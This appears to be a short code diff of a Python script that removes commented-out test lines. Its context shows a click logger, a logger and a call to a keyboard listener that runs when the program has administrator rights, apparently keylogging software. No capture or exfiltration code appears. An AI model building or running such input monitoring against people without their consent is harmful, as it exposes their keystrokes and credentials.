@@ -23,11 +23,6 @@ if __name__ == "__main__":
     clicklog = ClickLogger()
     logger = Logger()
     
-    # teste = ['tab', 'enter', 'esc']
-    
-    # if 'tab' in teste:
-    #     print(1)
-    
     if main.is_admin():
         try:
             keylog.keyboard_listener()
